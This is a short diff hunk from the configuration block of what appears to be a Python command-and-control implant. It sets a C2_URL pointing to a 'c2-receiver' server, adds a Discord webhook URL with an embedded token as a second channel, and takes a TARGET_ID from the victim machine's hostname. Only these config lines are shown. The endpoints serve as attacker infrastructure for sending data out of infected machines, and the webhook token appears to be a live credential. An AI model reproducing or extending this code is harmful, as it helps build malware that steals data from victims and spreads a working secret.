@@ -16,7 +16,8 @@ from datetime import datetime
 from io import BytesIO
 
 # ===== CONFIG =====
-C2_URL = "https://c2-receiver.onrender.com"   # <-- CHANGE THIS
+C2_URL = "https://c2-receiver.onrender.com"# <-- CHANGE THIS
+DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1543840098548846643/Nl_mYva2hVTQW3B9mriAFdLJzzFl5ng_lLTvv0_pv8kBv-J9QOmu64DE7ZrleN7PMZEl"
 # ==================
 
 TARGET_ID = socket.gethostname()
